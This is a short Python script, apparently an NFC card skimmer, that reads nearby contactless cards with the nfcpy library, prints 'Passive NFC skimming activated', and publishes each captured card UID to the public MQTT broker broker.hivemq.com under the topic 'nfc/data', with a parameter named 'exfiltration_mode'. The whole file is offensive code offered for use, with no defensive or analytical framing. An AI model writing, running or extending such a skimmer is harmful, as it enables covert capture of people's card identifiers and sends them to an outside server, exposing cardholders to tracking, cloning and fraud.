import nfc
import json
import paho.mqtt.client as mqtt

class PassiveNFCLogger:
    def __init__(self, device="usb", exfiltration_mode="mqtt"):
        self.device = device
        self.mqtt_client = mqtt.Client()
        self.mqtt_client.connect("broker.hivemq.com", 1883)
        self.mqtt_client.loop_start()

    def sniff_traffic(self):
        with nfc.ContactlessFrontend(self.device) as clf:
            print("Passive NFC skimming activated...")
            clf.connect(rdwr={"on-connect": self._process_tag})

    def _process_tag(self, tag):
        card_uid = tag.identifier.hex()
        tag_data = {"uid": card_uid}
        print(f"Captured card UID: {card_uid}")
        self.mqtt_client.publish("nfc/data", json.dumps(tag_data))
